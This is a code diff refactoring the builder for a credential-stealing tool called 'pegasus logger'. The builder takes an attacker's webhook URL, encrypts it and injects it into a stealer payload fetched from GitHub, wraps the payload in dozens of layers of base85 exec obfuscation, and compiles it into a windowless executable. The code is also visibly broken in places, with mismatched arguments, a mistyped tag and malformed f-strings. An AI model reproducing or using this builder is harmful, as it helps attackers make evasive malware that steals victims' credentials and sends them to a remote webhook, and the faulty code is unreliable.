@@ -1,19 +1,21 @@
-import base64
-from fileinput import filename
-import os
-import shutil
-import time
-
-import requests
-from alive_progress import alive_bar
-from colorama import Fore, Style, init
+from os import system, remove
+from pathlib import Path
+from base64 import a85encode
+from time import sleep
+from shutil import rmtree
+from requests import Response, get, exceptions
 from cryptography.fernet import Fernet
+from threading import Thread
+from urllib.parse import urldefrag
 
+from rich.console import Console
+from rich.progress import Progress
 
-def main(level, filename):
-    print(
-        Fore.BLUE
-        + """
+def main(console:Console = None):
+    console = console or Console()
+
+    console.print(
+        f"""[blue]
 __________
 \______   \ ____   _________    ________ __  ______
  |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
@@ -22,72 +24,126 @@ __________
                \/_____/     \/     \/           \/
 
             Builder for pegasus logger
-           github.com/addi00000/pegasus"""
-        + Style.RESET_ALL
+           github.com/addi00000/pegasus[/blue]"""
     )
 
-    webhook = input(f"{Fore.CYAN}Webhook URL: {Style.RESET_ALL}")
-    key = Fernet.generate_key()
-    token = Fernet(key).encrypt(bytes(webhook, "utf-8"))
-    line_to_inject = f"Fernet({key}).decrypt({token}).decode()"
+    webhook = get_webhook(console)
 
-    try:
-        resp = requests.get(webhook)
-        if not resp.ok:
-            print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
-            exit()
-    except Exception:  # TODO: Clarify exceptions and a couple more
-        print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
-        exit()
+    if webhook is None:
+        return
 
-    filename = input(f"{Fore.CYAN}Filename: {Style.RESET_ALL}")
+    token, line_to_inject = get_token_and_injection_code(webhook)
+    basename = prompt("[cyan]Base name: [/]")
 
-    raw = requests.get(
-        "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py"
-    ).text
-
-    print(
-        f"{Fore.YELLOW}Creating {filename}.py with '{webhook}' as webhook...{Style.RESET_ALL}"
+    console.print(
+        f"[yellow]Creating {basename}.py with '{webhook}' as webhook...[/yelow]"
     )
+    # Download pegasus.py and inject.js
+    raw, _ = download("https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py", "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js")
 
-    with open(f"{filename}.py", "w", encoding="utf-8") as f:
-        f.write(raw.replace('"&WEBHOOK_URL&"', line_to_inject))
+    with open(f"{basename}.py", "w", encoding="utf-8") as f:
+        f.write(raw.read_text().replace('"&WEBHOOK_URL&"', line_to_inject))
 
-    print(f"{Fore.GREEN}Done!{Style.RESET_ALL}")
+    console.print(f"[green]Done![/green]")
 
-    level = get_level()
-    Obfuscate()
+    obfuscation_level = get_level(console)
+    CodeObfuscator(obfuscation_level)
 
-    compile = input(f"{Fore.CYAN}Obfuscation level (1-30): {Style.RESET_ALL}").lower()
-
+    compile = prompt(f"[cyan]Obfuscation level (1-30): [/cyan]").lower()
     if compile != "y":
         print("I think you said no. Please re-run the script if you said 'yes'")
         return
 
-    print(f"{Fore.YELLOW}Beginning compilation...{Style.RESET_ALL}")
+    compile_file(basename, console)
+    clean_build_files(basename)
+
+    prompt("[green]Done!\nPress enter to exit...[/green]")
+
+def clean_build_files(basename:str):
+    rmtree("./build")
+    rmtree("./__pycache__")
+    remove(f"./{basename}-obfuscated.spec")
+
+def get_token_and_injection_code(webhook:bytes) -> tuple[bytes, str]:
+    key = Fernet.generate_key()
+    token = Fernet(key).encrypt(webhook)
+    line_to_inject = f"Fernet({key}).decrypt({token}).decode()"
+
+    return token, line_to_inject
+
+def get_webhook(console:Console):
+    while True:
+        webhook = prompt("[cyan]Webhook URL: [/cyan]")
+
+        try:
+            resp = get(webhook)
+        except exceptions.ConnectionError:
+            console.print(f"[red]Cannot connect to [link={webhook}]the webhook[/link][/red]. Are you sure that you're connected to the internet?")
+            return
+
+        if not resp.ok:
+            console.print(f"[red link={webhook}]This webhook cannot be found[/red]")
+            continue
+        return webhook
+
+def download(*urls:str,chunk_size:int=1024) -> tuple[Path]:
+    files = []
+    with Progress() as progress:
+        threads = tuple(
+            Thread(
+                target=download_file,
+                args=(resp, filename, taskid, progress, chunk_size, files)
+                )
+            for resp, filename, taskid in generate_tasks(urls, chunk_size, progress)
+            )
+
+        while not progress.finished:
+            for thread in threads:
+                thread.start()
+
+            for thread in threads:
+                thread.join()
+
+    return tuple(*map(Path, files))
+
+def generate_tasks(urls:tuple[str], chunk_size:int, prog:Progress):
+    for url in urls:
+        filename = url.split("/")[-1].split("?")[0].split("#")[0]
+        resp = get(url, stream=True)
+        task = prog.add_task(f"Downloading {filename}", False, resp.headers.get("Content-Length") / chunk_size)
+        yield resp, filename,task
+
+
+def download_file(response:Response, filename:str, task_id:int, prog:Progress, chunk_size:int, file_list:list[str]):
+    with open(filename, "wb") as f:
+        for chunk in response.iter_content(chunk_size):
+            f.write(chunk)
+            prog.advance(task_id)
+    file_list.append(filename)
+
+def compile_file(basename:str, console:Console):
+    console.print(f"[yellow]Beginning compilation...[/yellow]")
     # Install requirements
-    os.system(r"pip install --upgrade -r .\requirements.txt")
+    system("pip install --upgrade -r requirements.txt")
 
     # Build the executable
-    os.system(
-        f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py"
+    system(
+        f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ {basename}-obfuscated.py"
     )
 
-    shutil.rmtree(r".\build")
-    shutil.rmtree(r".\__pycache__")
-    os.remove(f".\{filename}-obfuscated.spec")
+def prompt(prompt:str, console:Console=None) -> str:
+    console = console or Console()
+    console.print(prompt, end="")
+    return input("")
 
-    input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
-
-
-def get_level():
+def get_level(console:Console) -> int:
     while True:
-        raw = input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL)
-        num = str_to_int(num)
+        raw = prompt("[cyan]Obfuscation level (1-30): [/cyan]")
+        num = str_to_int(raw)
 
         if isinstance(num, int):
             return num
-        print("Level is not a number!\nTry again")
+        console.print("[bright red]Level is not a number!\nTry again[/bright red]")
 
 
 def str_to_int(num: str) -> int:
@@ -97,15 +153,15 @@ def str_to_int(num: str) -> int:
         return num
 
 
-class Obfuscate:
-    def __init__(self):
+class CodeObfuscator:
+    def __init__(self, filename:str, level:int=10):
         self.file = f"{filename}.py"
         self.level = level
 
         self.clean()
-        time.sleep(0.5)
+        sleep(0.5)
         self.save(
-            self.obfuscate(self.code(self.file), self.level),
+            self.generate_obfuscation_code(self.code(self.file), self.level),
             self.file,
             self.seperate_imports(self.file),
         )
@@ -129,28 +185,28 @@ class Obfuscate:
             )
         return imports
 
-    def obfuscate(self, code, level):
-        obfuscated = f"\nexec(base64.a85decode({base64.a85encode(code.encode('utf-8',errors = 'strict'))}))"
+    def generate_obfuscation_code(self, code, level):
+        obfuscated = f"\nexec(base64.a85decode({a85encode(code.encode('utf-8',errors = 'strict'))}))"
+        with Progress() as progress:
+            task = progress.add_task("Obfuscating Code", total=level)
 
-        with alive_bar(level) as bar:
             for _ in range(level):
-                obfuscated = f"import base64\nexec(base64.a85decode({base64.a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
-                bar()
+                obfuscated = f"import base64\nexec(base64.a85decode({a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
+                progress.advance(task)
 
         return obfuscated
 
-    def save(self, obfuscated, file, imports=None):
-        with open(f"{file.replace('.py', '')}-obfuscated.py", "a", encoding="utf-8") as f:
+    def save(self, obfuscated_code:str, file:str, imports:list[str]=None):
+        with open(f"{file:str.replace('.py', '')}-obfuscated.py", "a", encoding="utf-8") as f:
             for module in imports:
                 f.write(module + "\n")
 
-            f.write(obfuscated)
+            f.write(obfuscated_code)
 
     def clean(self):
-        if os.path.exists(f"{self.file.replace('.py', '')}-obfuscated.py"):
-            os.remove(f"{self.file.replace('.py', '')}-obfuscated.py")
+        if (path := Path(f"{self.file.replace('.py', '')}-obfuscated.py")).exists():
+            remove(path)
 
 
 if __name__ == "__main__":
-    init()
     main()
